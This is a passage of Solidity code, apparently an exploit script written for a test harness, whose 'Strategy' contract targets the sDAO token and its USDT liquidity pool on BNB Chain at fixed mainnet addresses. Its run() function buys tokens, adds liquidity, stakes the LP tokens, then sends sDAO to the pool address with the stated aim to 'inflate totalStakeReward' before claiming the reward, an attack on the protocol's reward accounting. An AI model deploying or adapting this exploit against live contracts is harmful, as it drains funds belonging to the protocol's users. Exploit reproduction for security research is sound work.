}

interface IERC20 {
    function transfer(address to, uint amount) external returns (bool);
    function transferFrom(address from, address to, uint amount) external returns (bool);
    function approve(address spender, uint amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint);
}

interface IUniswapV2Router {
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external payable returns (uint[] memory amounts);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract Strategy {
    IsDAO public constant sDAO = IsDAO(0x6666625Ab26131B490E7015333F97306F05Bf816);
    address public constant LP = 0x333896437125fF680f146f18c8A164Be831C4C71;
    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address public constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap router

    function run() public {
        // Step 1: Get some initial sDAO tokens by swapping ETH for sDAO
        uint ethAmount = address(this).balance;
        require(ethAmount > 0, "Need ETH");

        // Swap half ETH for sDAO
        IUniswapV2Router router = IUniswapV2Router(ROUTER);
        address[] memory path = new address[](2);
        path[0] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // WBNB on BSC
        path[1] = address(sDAO);

        uint[] memory amounts = router.swapExactETHForTokens{value: ethAmount/2}(
            0, // minimum amount out
            path,
            address(this),
            block.timestamp + 3600
        );

        uint sdaoBalance = amounts[1];
        require(sdaoBalance > 0, "Got no sDAO");

        // Step 2: Get LP tokens by adding liquidity
        // First approve router to spend our sDAO
        sDAO.approve(ROUTER, sdaoBalance);

        // Also need USDT, swap remaining ETH for USDT
        path[1] = USDT;
        amounts = router.swapExactETHForTokens{value: address(this).balance}(
            0,
            path,
            address(this),
            block.timestamp + 3600
        );

        uint usdtBalance = amounts[1];

        // Approve router to spend USDT
        IERC20(USDT).approve(ROUTER, usdtBalance);

        // Add liquidity to get LP tokens
        (uint amountA, uint amountB, uint liquidity) = router.addLiquidity(
            address(sDAO),
            USDT,
            sdaoBalance,
            usdtBalance,
            0,
            0,
            address(this),
            block.timestamp + 3600
        );

        require(liquidity > 0, "Got no LP tokens");

        // Step 3: Stake LP tokens
        IERC20(LP).approve(address(sDAO), liquidity);
        sDAO.stakeLP(liquidity);

        // Step 4: Transfer sDAO to LP address to inflate totalStakeReward
        // First need more sDAO... maybe swap more ETH?
        // Actually, we can use the sDAO we didn't use for liquidity
        uint sdaoRemaining = sDAO.balanceOf(address(this));
        if (sdaoRemaining > 0) {
            // Transfer sDAO to LP address
            sDAO.transfer(LP, sdaoRemaining);
        }

        // Step 5: Claim reward
        sDAO.getReward();

        // Step 6: Convert sDAO to base token via DexUtils
        // The harness will call DexUtils.swapExcessTokensToBaseToken for us
    }

    receive() external payable {}
}
